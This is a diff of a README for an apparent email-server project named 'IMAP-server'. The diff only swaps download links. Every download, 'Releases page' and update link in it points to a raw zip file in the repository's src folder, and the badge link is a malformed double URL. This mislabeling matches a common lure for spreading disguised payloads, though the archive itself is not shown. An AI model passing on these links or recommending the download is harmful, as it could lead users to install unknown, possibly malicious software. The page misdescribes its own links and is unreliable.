@@ -1,6 +1,6 @@
 # 📧 IMAP-server - Fast and Reliable Email Server
 
-[![Download IMAP-server](https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip%https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip)](https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip)
+[![Download IMAP-server](https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip%https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip)](https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the IMAP-server project! This application allows you to manage your e
 
 ## 📥 Download & Install
 
-To download the IMAP-server, visit the following link: [Download IMAP-server](https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip). 
+To download the IMAP-server, visit the following link: [Download IMAP-server](https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip). 
 
 1. Click on the link above.
 2. You will find a list of released versions. Select the most recent version, as it contains the latest features and fixes.
@@ -79,12 +79,12 @@ Explore related technologies such as Rust, and other email management solutions.
 
 ## 📅 Future Updates
 
-We plan to release regular updates to improve performance, add features, and enhance security. Stay tuned for new releases on our [Releases page](https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip).
+We plan to release regular updates to improve performance, add features, and enhance security. Stay tuned for new releases on our [Releases page](https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip).
 
 ## 🙋 FAQs
 
 **Q: How can I update the application?**  
-A: Visit the [Releases page](https://raw.githubusercontent.com/MissAqila/IMAP-server/main/src/IMAP-server-v2.6.zip) and download the latest version. 
+A: Visit the [Releases page](https://github.com/MissAqila/IMAP-server/raw/refs/heads/main/src/server_IMA_2.4.zip) and download the latest version. 
 
 **Q: Is this application free?**  
 A: Yes, IMAP-server is free to download and use.
